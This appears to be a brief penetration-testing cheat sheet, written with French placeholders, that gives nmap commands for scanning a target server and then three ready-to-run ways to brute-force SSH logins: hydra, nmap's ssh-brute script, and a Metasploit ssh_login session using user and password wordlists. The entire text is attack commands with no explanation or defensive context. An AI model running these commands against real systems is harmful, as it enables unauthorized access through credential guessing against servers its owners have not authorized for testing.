nmap -v -A *ip_serveur*
nmap -v -A -Pn *ip_serveur*

# Hydra :
hydra -L users.txt -P passwords.txt ssh://*ip_serveur_ssh* -t 4

# Nmap :
nmap *ip_serveur_ssh* -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt
nmap -Pn *ip_serveur_ssh* -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt

# Metasploit :
msfconsole
use auxiliary/scanner/ssh/ssh_login
set rhosts *ip_serveur_ssh*
set stop_on_success true
set user_file users.txt
set pass_file passwords.txt
set verbose true
run
